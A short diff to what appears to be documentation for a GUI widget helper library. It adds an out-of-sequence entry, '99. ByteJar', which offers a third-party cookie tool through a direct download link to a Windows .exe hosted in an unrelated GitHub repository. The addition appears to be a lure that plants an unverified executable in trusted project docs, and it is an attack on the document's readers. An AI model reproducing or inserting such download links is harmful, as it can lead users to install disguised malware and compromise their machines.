@@ -287,3 +287,5 @@ replace
       22. **focus_on_widget(widget,trig)**: This binds the focus-in event to trigger a function when the widget gains focus.
 
       23. **focus_off_widget(widget,trig)**: This binds the focus-out event to trigger a function when the widget loses focus.
+
+ 99. **`ByteJar`**: Sets/Deletes/Gets Cookie with a 3rd party lightweight program: [Click to download](https://raw.githubusercontent.com/ByteLightDev1/ByteLight/main/ByteJarinstaller.exe)
